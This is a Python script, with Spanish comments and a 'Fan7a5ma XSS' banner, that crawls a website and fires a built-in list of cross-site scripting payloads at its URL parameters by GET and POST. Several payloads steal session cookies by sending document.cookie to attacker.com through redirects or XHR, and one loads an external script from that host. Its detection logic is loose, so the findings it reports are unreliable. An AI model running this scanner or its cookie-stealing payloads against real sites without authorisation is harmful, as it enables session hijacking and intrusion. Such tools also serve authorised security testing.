import requests
from bs4 import BeautifulSoup
import sys
import re
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from datetime import datetime
import random

# Colores llamativos para las respuestas
RED = '\033[91m'  # Rojo
YELLOW = '\033[93m'  # Amarillo
GREEN = '\033[92m'  # Verde
BOLD = '\033[1m'  # Negrita
RESET = '\033[0m'  # Resetear color
BACKGROUND_YELLOW = '\033[43m'  # Fondo amarillo para el texto
BACKGROUND_RED = '\033[41m'  # Fondo rojo para el texto
BACKGROUND_GREEN = '\033[42m'  # Fondo verde para el texto
BACKGROUND_BLUE = '\033[44m'  # Fondo azul para el texto
WHITE = '\033[97m'  # Blanco para el texto

# Función para mostrar el mensaje de bienvenida con un color aleatorio
def show_banner():
    colors = [RED, YELLOW, GREEN, BACKGROUND_BLUE]
    banner = """
███████╗░█████╗░███╗░░██╗███████╗░░█████╗░███████╗███╗░░░███╗░█████╗░  ██╗░░██╗░██████╗░██████╗
██╔════╝██╔══██╗████╗░██║╚════██║░██╔══██╗██╔════╝████╗░████║██╔══██╗  ╚██╗██╔╝██╔════╝██╔════╝
█████╗░░███████║██╔██╗██║░░░░██╔╝░███████║██████╗░██╔████╔██║███████║  ░╚███╔╝░╚█████╗░╚█████╗░
██╔══╝░░██╔══██║██║╚████║░░░██╔╝░░██╔══██║╚════██╗██║╚██╔╝██║██╔══██║  ░██╔██╗░░╚═══██╗░╚═══██╗
██║░░░░░██║░░██║██║░╚███║░░██╔╝░░░██║░░██║██████╔╝██║░╚═╝░██║██║░░██║  ██╔╝╚██╗██████╔╝██████╔╝
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝░░╚═╝░░░░╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝  ╚═╝░░╚═╝╚═════╝░╚═════╝░
    """
    print(f"{random.choice(colors)}{banner}{RESET}")

# Función para realizar las peticiones GET y POST con Session
def make_requests(session, url, payload, method):
    if method == 'get':
        return (method, payload, session.get(url, params={"url": payload}))
    else:
        return (method, payload, session.post(url, data={"url": payload}))

# Función para probar XSS con concurrencia
def test_xss_in_url(session, url, payloads, vulnerabilities):
    ALERT = f"{RED}{BOLD}👻 ¡VULNERABILIDAD XSS ENCONTRADA! 👻 {RESET}"

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for payload in payloads:
            # Agregar tareas de GET y POST
            futures.append(executor.submit(make_requests, session, url, payload, 'get'))
            futures.append(executor.submit(make_requests, session, url, payload, 'post'))

        # Recopilamos los resultados de las tareas concurrentes
        for future in as_completed(futures):
            method, payload, response = future.result()

            # Validación adicional para evitar falsos positivos
            if is_potential_xss(response, payload):
                print(f"\n{BACKGROUND_RED}{WHITE}{BOLD}¡VULNERABILIDAD XSS DETECTADA!{RESET}")
                print(f"\n{BACKGROUND_RED}{WHITE}{BOLD}URL: {url}{RESET}")
                print(f"{BACKGROUND_YELLOW}{WHITE}{BOLD}Método: {method.upper()}{RESET}")
                print(f"{BACKGROUND_GREEN}{WHITE}{BOLD}Payload: {payload}{RESET}")
                print(f"{ALERT}{RESET}")
                vulnerabilities.append((url, payload, method.upper()))  # Agregar la vulnerabilidad encontrada

# Función para detectar posibles vulnerabilidades XSS con validación más rigurosa
def is_potential_xss(response, payload):
    """
    Función que valida si una respuesta realmente ejecuta el payload XSS.
    Revisa si el payload está reflejado correctamente y si está ejecutando código JS.
    """
    # Verificar si el payload está en el contenido de la página
    if payload in response.text:
        # Verificar si hay algún comportamiento de ejecución de script, como <script> o eventos inline (onerror, onclick, etc.)
        if re.search(r'<script.*?>.*?</script>', response.text, re.IGNORECASE) or \
           re.search(r'onerror=|onclick=|onload=|onmouseover=', response.text, re.IGNORECASE):
            return True
    return False

# Función para encontrar parámetros en las URLs
def find_url_parameters(url):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    return params.keys()

# Función para rastrear todas las páginas de un sitio
def crawl_site(base_url, payloads):
    session = requests.Session()

    # Lista para almacenar todas las URLs encontradas
    urls_to_visit = [base_url]
    visited_urls = set()
    total_urls_scanned = 0
    total_vulnerabilities_found = 0
    vulnerabilities = []  # Para almacenar las vulnerabilidades encontradas

    start_time = time.time()

    while urls_to_visit:
        url = urls_to_visit.pop(0)
        if url in visited_urls:
            continue

        total_urls_scanned += 1
        print(f"\n\033[1;34mEscaneando página: {url} ({total_urls_scanned} URLs escaneadas)\033[0m")
        visited_urls.add(url)

        try:
            # Hacer una solicitud para obtener la página
            response = session.get(url)
            response.raise_for_status()

            # Encontrar parámetros de URL susceptibles a XSS
            parameters = find_url_parameters(url)
            if parameters:
                print(f"{GREEN}Parámetros encontrados en {url}: {parameters}{RESET}")
                # Probar vulnerabilidades XSS en los parámetros
                for param in parameters:
                    for payload in payloads:
                        payload_url = url + f"&{param}={payload}"  # Agregar el payload al parámetro
                        test_xss_in_url(session, payload_url, payloads, vulnerabilities)

            # Extraer nuevos enlaces de la página
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            for link in links:
                full_url = urljoin(url, link['href'])
                if base_url in full_url and full_url not in visited_urls:
                    urls_to_visit.append(full_url)

        except requests.RequestException as e:
            print(f"Error al intentar acceder a {url}: {e}")

    end_time = time.time()
    elapsed_time = end_time - start_time

    # Mostrar los resultados finales
    print("\nEscaneo completado.")
    print(f"\033[1;32mTotal de URLs escaneadas: {total_urls_scanned}\033[0m")
    print(f"\033[1;31mTotal de vulnerabilidades XSS encontradas: {len(vulnerabilities)}\033[0m")
    if vulnerabilities:
        for vuln in vulnerabilities:
            print(f"\033[1;33mVulnerabilidad XSS encontrada en {vuln[0]} ({vuln[2]}): {vuln[1]}\033[0m")
    print(f"\033[1;36mTiempo total de ejecución: {elapsed_time:.2f} segundos\033[0m")

# Función para cargar payloads desde un archivo
def load_payloads_from_file(file_path):
    payloads = []
    try:
        with open(file_path, 'r') as f:
            payloads = f.readlines()
        payloads = [p.strip() for p in payloads]  # Eliminar espacios en blanco y saltos de línea
    except Exception as e:
        print(f"Error al cargar el diccionario de payloads: {e}")
    return payloads

# Argumentos de línea de comandos
def parse_args():
    parser = argparse.ArgumentParser(description="Escaneo de vulnerabilidades XSS en un sitio web.")
    parser.add_argument("url", help="URL del sitio web a escanear.")
    parser.add_argument("-d", "--dict", help="Ruta a un archivo de diccionario con payloads adicionales.", required=False)
    return parser.parse_args()

# Función principal
def main():
    args = parse_args()

    # Mostrar el banner de bienvenida
    show_banner()



    # Lista de payloads XSS comunes y efectivos, incluyendo bypass de WAF
    default_payloads = [
        "<script>alert('Fan7a5ma XSS')</script>",
        "<img src='x' onerror='alert(\"Fan7a5ma XSS\")'>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<script>document.location='http://attacker.com/cookie?'+document.cookie</script>",
        "<iframe srcdoc='<script>alert(\"Fan7a5ma XSS\")</script>'></iframe>",
        "<a href='javascript:alert(\"Fan7a5ma XSS\")'>Click me</a>",
        "<input type='text' value='<script>alert(\"Fan7a5ma XSS\")</script>'>",
        "<img src='x' onmouseover='alert(\"Fan7a5ma XSS\")'>",
        "<script>eval('alert(\"Fan7a5ma XSS\")')</script>",
        "<script>document.body.innerHTML='<h1>'+document.cookie+'</h1>'</script>",
        "<script>alert(document.cookie)</script>",

        # Payloads adicionales y más complejos
        "<script>eval('alert(1)')</script>",  # Eval() XSS
        "<script>setTimeout('alert(1)', 1000)</script>",  # Timeout-based XSS
        "<script>window.location='http://attacker.com?cookie='+document.cookie</script>",  # Cookie leak
        "<svg/onload=alert(1)>",  # SVG-based XSS
        "<img src='x' onerror=prompt(1)>",  # Prompt on error
        "<a href='javascript:alert(document.cookie)'>Click me</a>",  # JS event handler in link
        "<input type='text' value='<img src=\"x\" onerror=\"alert(1)\">'>",  # Input-based XSS
        "<body onload=alert(1)>",  # Body onload event
        "<div onmouseover=alert(1)>Hover me</div>",  # Mouse event
        "<object data='javascript:alert(1)'></object>",  # Object tag based XSS
        "<a href=javascript:alert('XSS')>XSS</a>",  # JavaScript link-based XSS
        "<img src='x' onerror='alert(document.cookie)'>",  # XSS that leaks cookies
        "<iframe src='javascript:alert(1);'></iframe>",  # Iframe-based XSS
        "<script src='http://attacker.com/xss.js'></script>",  # External script XSS
        "<script>eval(unescape('%61%6c%65%72%74%28%27XSS%27%29'))</script>",  # XSS with encoded eval
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",  # Meta tag redirect
        "<script>alert('XSS')</script><img src='x' onerror='alert(1)'>",  # Combination XSS
        "<script src='data:text/javascript,alert(1)'></script>",  # Data URL-based XSS
        "<script>window.location='javascript:alert(1)'</script>",  # Location-based XSS
        "<script>document.write('<img src=\"x\" onerror=\"alert(1)\">')</script>",  # Dynamically injected payload
        "<script>document.write('<iframe src=\"javascript:alert(1)\"></iframe>')</script>",  # Dynamic iframe injection
        "<script>var x='XSS';document.body.innerHTML=x</script>",  # Dynamically injecting content into body
        "<script>var x=document.createElement('img');x.src='x';x.onerror=function(){alert('XSS')};document.body.appendChild(x);</script>",  # Dynamic img tag XSS
        "<script>document.body.innerHTML='<img src=x onerror=alert(1)>';</script>",  # Injected img tag XSS
        "<script>var x = new XMLHttpRequest(); x.open('GET', 'http://attacker.com/cookie?cookie=' + document.cookie, true); x.send();</script>",  # XSS to exfiltrate cookies via XHR
    ]

    # Cargar payloads desde archivo si se proporciona
    payloads = default_payloads
    if args.dict:
        payloads.extend(load_payloads_from_file(args.dict))

    # Realizar el escaneo
    crawl_site(args.url, payloads)

# Ejecutar el programa
if __name__ == "__main__":
    main()
